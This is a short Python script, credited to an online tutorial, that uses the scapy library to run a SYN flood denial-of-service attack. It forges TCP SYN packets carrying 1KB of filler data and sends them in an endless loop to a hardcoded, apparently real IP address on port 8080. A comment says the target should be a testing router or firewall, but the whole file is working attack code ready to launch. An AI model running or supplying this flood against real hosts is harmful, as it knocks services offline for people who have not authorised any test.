# This is heavily based on https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python
import scapy.all

# target IP address (should be a testing router/firewall)
target_ip = "131.229.238.255"
# the target port u want to flood
target_port = 8080

# forge IP packet with target ip as the destination IP address
ip = scapy.all.IP(dst=target_ip)

# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = scapy.all.TCP(sport=scapy.all.RandShort(), dport=target_port, flags="S")

# add some flooding data (1KB in this case)
raw = scapy.all.Raw(b"X" * 1024)

# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected
scapy.all.send(p, loop=1, verbose=0)
